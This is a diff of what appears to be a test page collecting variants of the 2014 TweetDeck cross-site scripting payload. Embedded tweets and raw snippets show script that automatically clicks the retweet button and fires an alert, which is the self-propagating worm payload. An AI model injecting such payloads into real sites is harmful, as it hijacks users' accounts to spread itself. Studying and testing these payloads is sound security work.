@@ -142,7 +142,7 @@ Ob das wohl funktioniert: <strong>Test</strong> <img src="https://abs.twimg.com/
 ---
 
 <blockquote class="twitter-tweet" lang="en"><p>&lt;script class=&quot;xss&quot;&gt;
-$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click(); 
+$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click();
 $(&#39;[data-action=retweet]&#39;).click();
 <br>alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;<img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;"></p>&mdash; *arrrrndy (@derGeruhn) <a href="https://twitter.com/derGeruhn/status/476764918763749376">June 11, 2014</a></blockquote>
 <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
@@ -154,15 +154,18 @@ $(&#39;[data-action=retweet]&#39;).click();
 ---
 
 <blockquote class="twitter-tweet" lang="en"><p>&lt;script class=&quot;xss&quot;&gt;
-$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click(); 
+$(&#39;.xss&#39;).parents().eq(1).find(&#39;a&#39;).eq(1).click();
 $(&#39;[data-action=retweet]&#39;).click();
 <br>alert(&#39;XSS in Tweetdeck&#39;)&lt;/script&gt;<img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;"></p>&mdash; *arrrrndy (@derGeruhn) <a href="https://twitter.com/derGeruhn/status/476764918763749376">June 11, 2014</a></blockquote>
 <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
 
 ---
 
-&lt;script class="xss">
+&lt;script>
 
+&nbsp;
+
+&nbsp;
 
 alert('XSS in Tweetdeck');
 
@@ -171,19 +174,26 @@ alert('XSS in Tweetdeck');
 
 &lt;script>
 
-
-alert('XSS in Tweetdeck');
-
-&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
----
-
-&lt;script class="xss">
+&nbsp;
 
 $('[data-action=retweet]').click();
 
 alert('XSS in Tweetdeck');
 
 &lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
+
+---
+
+&lt;script class="xss">
+
+&nbsp;
+
+$('[data-action=retweet]').click();
+
+alert('XSS in Tweetdeck');
+
+&lt;/script><img src="https://abs.twimg.com/emoji/v1/72x72/2665.png" style="border: none; top: 30px; position: relative;">
+
 ---
 
 &lt;script class="xss">
